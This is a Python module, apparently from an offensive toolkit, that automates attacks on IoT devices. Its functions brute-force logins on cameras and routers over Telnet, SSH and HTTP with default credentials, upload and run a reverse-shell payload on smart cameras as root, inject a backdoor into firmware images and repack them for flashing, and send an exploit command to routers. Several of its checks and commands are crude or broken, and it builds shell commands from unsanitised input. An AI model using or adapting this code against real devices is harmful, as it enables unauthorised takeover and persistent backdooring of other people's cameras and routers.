# modules/iot_exploit_ext.py

import subprocess
import os
import logging
import re

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def validate_ip(ip: str) -> bool:
    """
    Validates an IP address format.
    """
    ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return bool(ip_pattern.match(ip))

def run_command(command: str, timeout: int, error_message: str) -> str:
    """
    Helper function to run a shell command with error handling.
    """
    try:
        result = subprocess.run(command, shell=True, timeout=timeout, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            logging.error(f"{error_message}: {result.stderr}")
            return f"[!] {error_message}: {result.stderr}"
    except subprocess.TimeoutExpired:
        logging.error(f"{error_message}: Command timed out.")
        return f"[!] {error_message}: Command timed out."
    except Exception as e:
        logging.error(f"{error_message}: Unexpected error: {e}")
        return f"[!] {error_message}: Unexpected error: {e}"

def exploit_iot_device(ip: str = "", creds: dict = None) -> str:
    """
    Attempts default‐credential login on common IoT devices (Telnet, SSH, HTTP).
    """
    if not validate_ip(ip):
        return "[!] Invalid IP address format."

    default_creds = [("admin", "admin"), ("root", "root"), ("admin", "password")]
    for u, p in default_creds:
        try:
            logging.info(f"Attempting Telnet login on {ip} with {u}:{p}...")
            telnet_result = run_command(f"echo '{u}\n{p}' | telnet {ip} 23", 5, "Telnet login failed")
            if "Login successful" in telnet_result:
                return f"[*] Telnet login successful on {ip} with {u}:{p}"

            logging.info(f"Attempting SSH login on {ip} with {u}:{p}...")
            ssh_result = run_command(f"sshpass -p {p} ssh -o StrictHostKeyChecking=no {u}@{ip} exit", 5, "SSH login failed")
            if "[!]" not in ssh_result:
                return f"[*] SSH login successful on {ip} with {u}:{p}"

            logging.info(f"Attempting HTTP login on {ip} with {u}:{p}...")
            http_result = run_command(f"curl -u {u}:{p} http://{ip}", 5, "HTTP login failed")
            if "200 OK" in http_result:
                return f"[*] HTTP login successful on {ip} with {u}:{p}"
        except Exception as e:
            logging.error(f"Unexpected error during login attempt: {e}")
    return "[!] IoT exploit failed."

def backdoor_smart_camera(ip: str, payload_path: str) -> str:
    """
    Installs a reverse shell payload into a smart‐camera firmware via SSH or HTTP exploit.
    """
    if not validate_ip(ip):
        return "[!] Invalid IP address format."
    if not os.path.exists(payload_path):
        return "[!] Payload file not found."

    logging.info(f"Uploading payload to smart camera at {ip}...")
    upload_result = run_command(f"scp {payload_path} root@{ip}:/tmp/", 10, "Failed to upload payload")
    if "[!]" in upload_result:
        return upload_result

    logging.info("Executing payload on smart camera...")
    exec_result = run_command(f"ssh root@{ip} 'chmod +x /tmp/payload && /tmp/payload'", 10, "Failed to execute payload")
    if "[!]" in exec_result:
        return exec_result
    return "[*] Payload executed successfully on smart camera."

def firmware_backdoor_inject(firmware_path: str, output_path: str, payload_path: str) -> str:
    """
    Unpacks a firmware image, injects a backdoor, repacks, and prepares for flashing.
    """
    if not os.path.exists(firmware_path):
        return "[!] Firmware file not found."
    if not os.path.exists(payload_path):
        return "[!] Payload file not found."

    logging.info("Unpacking firmware image...")
    unpack_result = run_command(f"binwalk --extract {firmware_path}", 30, "Failed to unpack firmware")
    if "[!]" in unpack_result:
        return unpack_result

    logging.info("Injecting payload into firmware...")
    extracted_dir = firmware_path + ".extracted"
    payload_dest = os.path.join(extracted_dir, "payload")
    try:
        os.replace(payload_path, payload_dest)
    except Exception as e:
        logging.error(f"Failed to inject payload: {e}")
        return "[!] Failed to inject payload."

    logging.info("Repacking firmware image...")
    repack_result = run_command(f"mkimage -A arm -O linux -T firmware -C none -a 0x00000000 -e 0x00000000 -n 'backdoored' -d {extracted_dir} {output_path}", 30, "Failed to repack firmware")
    if "[!]" in repack_result:
        return repack_result
    return "[*] Firmware backdoor injected and repacked successfully."

def exploit_router_firmware(ip: str, exploit_command: str) -> str:
    """
    Uses a known router firmware exploit (e.g. CVE‐2018‐xxxx) to get root and drop a payload.
    """
    if not validate_ip(ip):
        return "[!] Invalid IP address format."

    logging.info(f"Executing router firmware exploit on {ip}...")
    result = run_command(f"curl -X POST {ip} -d '{exploit_command}'", 10, "Router firmware exploit failed")
    if "[!]" in result:
        return result
    return "[*] Router firmware exploit executed successfully."
